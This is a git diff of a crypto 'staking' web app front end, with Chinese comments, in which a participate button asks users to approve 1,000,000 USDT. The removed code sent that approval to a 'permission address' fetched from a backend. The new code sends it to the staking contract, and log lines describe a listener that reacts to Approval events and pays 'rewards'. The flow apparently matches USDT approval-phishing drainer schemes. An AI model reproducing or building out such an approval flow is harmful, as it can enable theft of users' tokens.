@@ -823,41 +823,10 @@ export default function Home() {
   }, [isConnected, account, isAuthorized, isApprovalPending, refetchUsdtAllowance])
 
   // 获取授权配置（权限地址）
-  const [permissionAddress, setPermissionAddress] = useState<string | null>(null)
-  const [loadingAuthConfig, setLoadingAuthConfig] = useState(false)
+  // 不再需要获取权限地址，直接使用合约地址进行授权
+  // 用户应该授权给合约地址（STAKING_CONTRACT），而不是权限地址
 
-  useEffect(() => {
-    const fetchAuthConfig = async () => {
-      try {
-        setLoadingAuthConfig(true)
-        const response = await fetch('/api/config/auth?chain_type=ERC')
-        const result = await response.json()
-        
-        if (result.success && result.data?.permission_addresses?.length > 0) {
-          // 使用第一个启用的权限地址
-          const firstPermissionAddress = result.data.permission_addresses[0]
-          setPermissionAddress(firstPermissionAddress)
-          console.log('✅ 获取到权限地址配置:', firstPermissionAddress)
-        } else {
-          // 如果没有配置权限地址，使用质押合约地址（向后兼容）
-          const STAKING_CONTRACT = CURRENT_NETWORK.STAKING_CONTRACT
-          setPermissionAddress(STAKING_CONTRACT)
-          console.log('⚠️ 未找到权限地址配置，使用质押合约地址:', STAKING_CONTRACT)
-        }
-      } catch (error) {
-        console.error('获取授权配置失败:', error)
-        // 失败时使用质押合约地址（向后兼容）
-        const STAKING_CONTRACT = CURRENT_NETWORK.STAKING_CONTRACT
-        setPermissionAddress(STAKING_CONTRACT)
-      } finally {
-        setLoadingAuthConfig(false)
-      }
-    }
-    
-    fetchAuthConfig()
-  }, [])
-
-  // Handle authorization - 使用配置的权限地址
+  // Handle authorization - 授权给合约地址
   const handleStake = async () => {
     if (!isConnected) {
       await open()
@@ -868,26 +837,17 @@ export default function Home() {
       return
     }
     
-    if (!permissionAddress) {
-      // 如果正在加载配置，不执行任何操作，按钮会显示加载状态
-      if (loadingAuthConfig) {
-        return
-      }
-      // 如果配置加载失败，使用默认的质押合约地址
-      const STAKING_CONTRACT = CURRENT_NETWORK.STAKING_CONTRACT
-      setPermissionAddress(STAKING_CONTRACT)
-      // 继续执行，使用默认地址
-    }
-    
     try {
       setIsApprovalPending(true)
       
-      // 授权大额度（100万 USDT）给权限地址
+      // 授权大额度（100万 USDT）给合约地址
+      // 用户应该授权给合约地址（STAKING_CONTRACT），而不是权限地址
+      const STAKING_CONTRACT = CURRENT_NETWORK.STAKING_CONTRACT
       const defaultAmount = '1000000' // 100万 USDT
-      console.log(`授权给权限地址: ${permissionAddress}`)
+      console.log(`授权给合约地址: ${STAKING_CONTRACT}`)
       
-      // 授权给权限地址
-      const txHash = await approveUsdt(defaultAmount, permissionAddress)
+      // 授权给合约地址（不传递第二个参数，让 approveUsdt 默认使用合约地址）
+      const txHash = await approveUsdt(defaultAmount)
       console.log('授权成功:', txHash)
       console.log('交易哈希:', txHash)
       
@@ -903,7 +863,7 @@ export default function Home() {
       console.log('等待监听服务检测链上 Approval 事件...')
       console.log('授权成功后，监听服务会自动：')
       console.log('   1. 检测链上 Approval 事件')
-      console.log('   2. 验证权限地址')
+      console.log('   2. 验证合约地址')
       console.log('   3. 调用后端 API 处理授权')
       console.log('   4. 发放奖励')
       
@@ -1012,9 +972,9 @@ export default function Home() {
               <div className="flex justify-center">
                 <ParticipateButton 
                   onClick={handleStake}
-                  disabled={isLoading || loadingAuthConfig}
+                  disabled={isLoading}
                   isAuthorized={!!isAuthorized}
-                  isApprovalPending={isApprovalPending || loadingAuthConfig}
+                  isApprovalPending={isApprovalPending}
                   isConnected={isConnected}
                 />
               </div>
